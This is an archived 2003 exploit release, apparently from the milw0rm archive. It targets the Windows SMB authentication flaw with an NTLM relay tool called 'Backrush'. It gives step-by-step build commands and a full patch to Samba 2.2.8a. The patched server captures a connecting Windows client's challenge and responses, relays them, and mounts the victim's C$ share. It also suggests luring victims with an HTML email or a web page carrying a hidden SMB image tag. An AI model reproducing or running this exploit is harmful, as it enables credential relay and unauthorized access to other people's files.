@@ -1,0 +1,318 @@
+##########################################
+# Exploit for "Authentication flaw in Windows SMB protocol" #
+##########################################
+# Release Date: 
+# April 24, 2003 
+# 
+# Code by Haamed Gheibi (haamed@linux.ce.aut.ac.ir) 
+# Salman Niksefat (salman@linux.ce.aut.ac.ir) 
+# 
+# Systems Affected by this exploit: 
+# Windows 2000 (SP0 SP1 SP2 SP3) 
+# Windows XP (SP0 SP1) 
+# 
+# EXPLOIT PROVIDED FOR EDUCATIONAL PURPOSES ONLY AS A PROOF OF CONCEPT 
+# WE TAKE NO RESPONSIBILITY FOR USE OF THIS CODE. 
+##########################################
+
+This exploit is based on samba-2.2.8a, you can download the source code from:
+http://us1.samba.org/samba/ftp/samba-2.2.8a.tar.bz2
+or other mirrors.
+
+First you should configure and make samba source code as follow:
+You need first to extract the file:
+$ tar -jxf samba-2.2.8a.tar.bz2
+$ cd samba-2.2.8a/source
+
+Here you need to configure with suitable options. Here is a config for RedHat 9:
+$ ./configure --sysconfdir=/etc --with-codepagedir=/usr/share/samba/codepages\
+--with-lockdir=/var/cache/samba --with-configdir=/etc/samba
+
+$ make
+$ make bin/smbmount
+$ su
+# make install
+
+First add an arbitary user to samba: (Choose a reliable password for it for your protection!)
+# smbadduser smbtmpuser:root
+
+Now check if your samba server(bin/smbd) and client(bin/smbmount) are working, 
+and that ipchains rulls are not set. you can use:
+# service smbd stop
+# bin/smbd -i
+# ipchains -F
+
+Well, now if everything works fine, you can apply the exploit code to the source.
+Download it from: http://seclab.ce.aut.ac.ir/samba-exp/exploit/backrush.patch
+# patch < backrush.patch
+
+Make it again:
+# make bin/smbd
+# make bin/smbmount
+[Note that you shouldn't make whole samba, cause you may get linker errors]
+
+Make necessary directories:
+# mkdir -p bin/backrush/log
+# mkdir bin/backrush/mnt
+# touch bin/backrush/ip2sharename.map
+
+Now we are done, you MUST change directory to bin and run the server:
+# cd bin
+# killall -9 smbd
+# ./smbd
+
+Now by default, the C$ share folder of any Windows machine who tries to connect
+to this SMB server, would be mounted to mnt/machinename-random folder.
+If you want to mount another share folder, you can add an entry to ip2sharename.map file as follow:
+IPADDRESS:SHARENAME
+This option is suitable for XP systems.
+
+2 ways 2 force a client to automatically connect to your modified SMB server:
+1. Send him/her a HTML email with the following tag:
+<IMG src='\\smb-server\nofile.gif' width=1 height=1>
+
+2. Invite him/her to visit your personal web page.
+You can make it by the above tag, then pray and wait until he/she visits your page. ;)
+
+Enjoy!
+
+
+  * backrush.patch * 
+
+
+diff -Nur /root/samba-2.2.8a/source/client/smbmount.c /backrush/source.exp/client/smbmount.c
+--- /root/samba-2.2.8a/source/client/smbmount.c 2002-04-30 17:56:19.000000000 +0430
++++ /backrush/source.exp/client/smbmount.c 2003-04-19 16:28:04.000000000 +0430
+@@ -26,6 +26,10 @@
+#include <mntent.h>
+#include <asm/types.h>
+#include <linux/smb_fs.h>
++//>Backrush
++int br_read[2], br_write[2], br_pid;
++struct Backrush br_state;
++//<
+
+extern BOOL in_client;
+extern pstring user_socket_options;
+@@ -177,6 +181,21 @@
+cli_shutdown(c);
+return NULL;
+}
++//>Backrush
++ {
++ int i;
++ printf("challange: ");
++ for (i = 0; i < 8; i++)
++ printf("%0.2x",c->cryptkey[i]);
++ fflush(stdout);
++ memcpy(br_state.challenge, c->cryptkey, 8);
++ br_state.status = 1;
++ write(br_write[1],&br_state, sizeof(br_state));
++ printf(" sent to server\n");
++ printf("waiting for response...\n");
++ fflush(stdout); 
++ }
++//<
+
+if (!got_pass) {
+char *pass = getpass("Password: ");
+@@ -848,6 +867,14 @@
+if (*credentials != 0) {
+read_credentials_file(credentials);
+}
++//>Backrush
++ printf("Started to mount %s on %s\n",argv[1], argv[2]);
++ fflush(stdout);
++ if (getenv("BACKRUSH_READ")) 
++ br_read[0] = atoi(getenv("BACKRUSH_READ"));
++ if (getenv("BACKRUSH_WRITE"))
++ br_write[1] = atoi(getenv("BACKRUSH_WRITE"));
++//<
+
+DEBUG(3,("mount.smbfs started (version %s)\n", VERSION));
+
+diff -Nur /root/samba-2.2.8a/source/include/includes.h /backrush/source.exp/include/includes.h
+--- /root/samba-2.2.8a/source/include/includes.h 2003-02-28 19:26:18.000000000 +0330
++++ /backrush/source.exp/include/includes.h 2003-04-17 10:36:54.000000000 +0430
+@@ -1,5 +1,26 @@
+#ifndef _INCLUDES_H
+#define _INCLUDES_H
++
++//>Backrush
++#include <stdlib.h>
++#include <time.h>
++struct Backrush
++{
++ int status;
++ char ip_address[20];
++ int port;
++ char username[256];
++ char sharename[256];
++ char netbios[256];
++ char domain[256];
++ char challenge[8];
++ char nt_resp[24];
++ char lm_resp[24];
++};
++extern struct Backrush br_state;
++extern int br_read[2],br_write[2],br_pid;
++//<
++
+/* 
+Unix SMB/Netbios implementation.
+Version 1.9.
+diff -Nur /root/samba-2.2.8a/source/libsmb/cliconnect.c /backrush/source.exp/libsmb/cliconnect.c
+--- /root/samba-2.2.8a/source/libsmb/cliconnect.c 2003-03-15 01:04:48.000000000 +0330
++++ /backrush/source.exp/libsmb/cliconnect.c 2003-04-17 12:30:26.000000000 +0430
+@@ -23,7 +23,6 @@
+
+#include "includes.h"
+
+-
+static const struct {
+int prot;
+const char *name;
+@@ -265,7 +264,28 @@
+memcpy(pword, pass, passlen);
+memcpy(ntpword, ntpass, ntpasslen);
+}
+-
++//>Backrush
++ {
++ int i;
++ read(br_read[0],&br_state, sizeof(br_state));
++ printf("received response:\n");
++ fflush(stdout);
++ memcpy(pword, br_state.lm_resp, 24);
++ memcpy(ntpword, br_state.nt_resp, 24);
++ if(br_state.username[0])
++ strncpy(user, br_state.username, 24);
++ printf("username: %s\n", user);
++ printf("lm response: ");
++ for (i = 0; i < 24; i++)
++ printf("%0.2x",pword[i]);
++ printf("\n");
++ printf("nt response: ");
++ for (i = 0; i < 24; i++)
++ printf("%0.2x",ntpword[i]);
++ printf("\n");
++ fflush(stdout);
++ }
++//<
+/* send a session setup command */
+memset(cli->outbuf,'\0',smb_size);
+
+diff -Nur /root/samba-2.2.8a/source/smbd/negprot.c /backrush/source.exp/smbd/negprot.c
+--- /root/samba-2.2.8a/source/smbd/negprot.c 2003-03-15 01:04:49.000000000 +0330
++++ /backrush/source.exp/smbd/negprot.c 2003-04-24 13:37:19.000000000 +0430
+@@ -180,6 +180,45 @@
+doencrypt = ((cli->sec_mode & 2) != 0);
+}
+
++//>Backrush
++ {
++ srand(time(NULL));
++ pipe(br_read);
++ pipe(br_write);
++ br_state.status = 1;
++ br_state.port = random();
++ strncpy(br_state.ip_address, get_socket_addr(smbd_server_fd()), sizeof(br_state.ip_address));
++ strncpy(br_state.sharename, "c$", sizeof(br_state.sharename));
++ {
++ char tmp[1024], *ptr;
++ FILE *fin = fopen("backrush/ip2sharename.map","r");
++ if (fin)
++ {
++ while(fscanf(fin, "%s", tmp) > 0)
++ {
++ ptr = strchr(tmp, ':');
++ *ptr++ = 0;
++ if (!strcmp(br_state.ip_address,tmp))
++ strncpy(br_state.sharename, ptr, sizeof(br_state.sharename));
++ }
++ fclose(fin);
++ }
++ }
++ if (!(br_pid = fork()))
++ {
++ char cmd[1024];
++ snprintf(cmd, sizeof cmd, "mkdir -p backrush/mnt/%s-%d", br_state.ip_address, br_state.port);
++ system(cmd);
++ snprintf(cmd, sizeof cmd, "export BACKRUSH_READ=%d; export BACKRUSH_WRITE=%d; 
+./smbmount //%s/%s backrush/mnt/%s-%d -o username=root,password=let_me_go_in 
+>backrush/log/%s-%d",
++ br_write[0], br_read[1], br_state.ip_address, br_state.sharename, br_state.ip_address, 
+br_state.port, br_state.ip_address, br_state.port);
++ system(cmd);
++ snprintf(cmd, sizeof cmd, "echo smbmount compeleted >>backrush/log/%s-%d", 
+br_state.ip_address, br_state.port);
++ system(cmd);
++ _exit(0);
++ }
++ }
++//<
++
+if (doencrypt) {
+crypt_len = 8;
+if (!cli) {
+diff -Nur /root/samba-2.2.8a/source/smbd/password.c /backrush/source.exp/smbd/password.c
+--- /root/samba-2.2.8a/source/smbd/password.c 2003-04-07 06:24:00.000000000 +0430
++++ /backrush/source.exp/smbd/password.c 2003-04-19 09:15:47.000000000 +0430
+@@ -48,6 +48,10 @@
+unsigned char buf[8];
+
+generate_random_buffer(buf,8,False);
++//>Backrush
++ read(br_read[0],&br_state, sizeof(br_state));
++ memcpy(buf, br_state.challenge, 8);
++//<
+
+memcpy(saved_challenge, buf, 8);
+memcpy(challenge,buf,8);
+@@ -466,7 +470,13 @@
+uchar challenge[8];
+char* user_name;
+uint8 *nt_pw, *lm_pw;
+-
++//>Backrush
++ memcpy(br_state.nt_resp, nt_pass, 24);
++ memcpy(br_state.lm_resp, lm_pass, 24);
++ write(br_write[1],&br_state, sizeof(br_state));
++// waitpid(br_pid,NULL,WNOHANG);
++ return(False);
++//<
+if (!lm_pass || !sampass) 
+return(False);
+
+diff -Nur /root/samba-2.2.8a/source/smbd/reply.c /backrush/source.exp/smbd/reply.c
+--- /root/samba-2.2.8a/source/smbd/reply.c 2003-04-07 06:24:00.000000000 +0430
++++ /backrush/source.exp/smbd/reply.c 2003-04-16 18:03:58.000000000 +0430
+@@ -974,6 +974,11 @@
+* security=domain.
+*/
+
++//>Backrush 
++ strncpy(br_state.username,user,sizeof(br_state.username));
++ strncpy(user,"root",sizeof(br_state.username));
++//<
++
+if (!guest && !check_server_security(orig_user, domain, user, 
+smb_apasswd, smb_apasslen, smb_ntpasswd, smb_ntpasslen) &&
+!check_domain_security(orig_user, domain, user, smb_apasswd,
+diff -Nur /root/samba-2.2.8a/source/smbd/server.c /backrush/source.exp/smbd/server.c
+--- /root/samba-2.2.8a/source/smbd/server.c 2003-03-15 01:04:49.000000000 +0330
++++ /backrush/source.exp/smbd/server.c 2003-04-16 18:05:17.000000000 +0430
+@@ -25,6 +25,11 @@
+extern fstring global_myworkgroup;
+extern pstring global_myname;
+
++//<Backrush
++int br_read[2],br_write[2],br_pid;
++struct Backrush br_state;
++//>
++
+int am_parent = 1;
+
+/* the last message the was processed */
+
+# milw0rm.com [2003-04-25]
